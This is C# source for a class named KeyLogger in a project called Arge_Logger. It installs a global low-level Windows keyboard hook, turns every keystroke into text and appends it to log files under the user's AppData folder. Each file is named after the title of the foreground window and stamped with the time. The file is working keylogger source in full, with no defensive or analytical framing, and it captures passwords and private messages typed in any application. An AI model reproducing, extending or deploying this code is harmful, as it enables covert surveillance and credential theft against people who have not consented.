using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace Arge_Logger
{
    class KeyLogger
    {
        public static string logFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
        private StreamWriter Out;
        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
        private static bool isClosed = false;
        private bool debug = Arge_Logger.Program.debug;
        private string lname = "log";

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;

        IntPtr hhook = IntPtr.Zero;
        keyboardHookProc khp;

        public KeyLogger()
        {
            Directory.CreateDirectory(logFolder);
            khp = new keyboardHookProc(hookProc);
            hook();
        }

        ~KeyLogger()
        {
            unhook();
        }

        public void hook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, hInstance, 0);
        }

        public void unhook()
        {
            UnhookWindowsHookEx(hhook);
        }

        public void GetKeyFromVCode(int nVirtualKey)
        {
            StringBuilder asciiKeyB = new StringBuilder(128);
            if (asciiKeyB == null)
                return;
            StringBuilder virtualKeyB = new StringBuilder(128);
            if (virtualKeyB == null)
                return;
            char asciiKey;
            string virtualKey;
            byte[] lpKeyboard = new byte[256];
            GetKeyState(VK_CAPITAL);
            GetKeyState(VK_SCROLL);
            GetKeyState(VK_NUMLOCK);
            GetKeyboardState(lpKeyboard);
            GetKeyNameText(MAKELONG(0, MapVirtualKey(nVirtualKey, 0)), virtualKeyB, 32);
            virtualKey = virtualKeyB.ToString();

            if (ToAscii(nVirtualKey, MapVirtualKey(nVirtualKey, 0), lpKeyboard, asciiKeyB, 0) == 1)
            {
                asciiKey = (asciiKeyB.ToString().ToCharArray())[0];
                if (asciiKey == '\r' || asciiKey == '\n') Out.WriteLine("[" + virtualKey + "]");
                else if (asciiKey < 33 || (asciiKey > 140 && asciiKey < 145) || asciiKey == 157 ||
                    asciiKey == 158 || asciiKey == 160 || asciiKey == 168)
                    Out.Write("[" + virtualKey + "]");
                else
                    Out.Write((char)asciiKey);
            }
            else
                Out.Write("[" + virtualKey + "]");
        }

        public int hookProc(int code, int wParam, ref keyboardHookStruct kbds)
        {
            if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
            {
                getWindow();
                GetKeyFromVCode(kbds.vkCode);
            }
            return CallNextHookEx(hhook, code, wParam, ref kbds);
        }

        public int MAKELONG(int a, int b)
        {
            return (int)(((ushort)a) | (uint)(b << 16));
        }

        public void CloseEvent()
        {
            isClosed = true;
            if (Out != null)
            {
                Out.Close();
                Out.Dispose();
            }
            if (debug)
                Writer.write("CloseEvent Acquired\n", Console.Out, this.GetType().Name);
        }

        public void OpenEvent()
        {
            char[] a = new char[] { '\\', '/', ':', '*', '?', '"', '<', '>', '|' };
            string fileName = logFolder;
            fileName += lname.Substring(lname.LastIndexOfAny(a) + 1) + ".txt";
            foreach (char c in a)
                fileName.Replace(c, '_');
            try
            {
                Out = File.AppendText(fileName);
            }
            catch (Exception e)
            {
                Writer.write("File open error " + e.Message, Console.Out, this.GetType().Name);
                fileName = "log.txt";
                Out = File.AppendText(fileName);
                return;
            }
            isClosed = false;
            if (debug)
                Writer.write("OpenEvent Acquired\n", Console.Out, this.GetType().Name);
        }

        public void getWindow()
        {
            try
            {
                while (isClosed)
                    System.Threading.Thread.Sleep(100);
                if (Out != null)
                    Out.Flush();
                char[] a = new char[] { '\\', '/', ':', '*', '?', '"', '<', '>', '|' };
                string fileName = logFolder;
                StringBuilder nameB = new StringBuilder(128);
                if (nameB == null)
                    return;
                GetWindowText(GetForegroundWindow(), nameB, 128);
                
                if (!lname.Equals(nameB.ToString()))
                {
                    lname = nameB.ToString();
                    fileName += lname.Substring(lname.LastIndexOfAny(a) + 1) + ".txt";
                    foreach (char c in a)
                        fileName.Replace(c, '_');
                    if (Out != null)
                        Out.Close();
                    Out = File.AppendText(fileName);
                    Out.WriteLine("----> " + DateTime.Now);
                    //Writer.write(, Out, "", false);
                }
            }
            catch (Exception e)
            {
                if (debug)
                    Writer.write(String.Format("Error Acquired: {0}\n", e.Message), Console.Out, this.GetType().Name);
                Thread.CurrentThread.Abort();
            }
        }

        const int VK_CAPITAL = 0x14;
        const int VK_SCROLL = 0x91;
        const int VK_NUMLOCK = 0x90;

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32.dll")]
        static extern short GetKeyState(int virtualKeyCode);

        [DllImport("user32.dll")]
        static extern int GetKeyboardState(byte[] keystate);

        [DllImport("user32.dll")]
        static extern int GetKeyNameText(int lParam, [Out] StringBuilder lpString, int nSize);

        [DllImport("user32.dll")]
        static extern int MapVirtualKey(int uCode, int uMapType);

        [DllImport("user32.dll")]
        static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpKeyState, [Out] StringBuilder lpChar, int uFlags);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
}
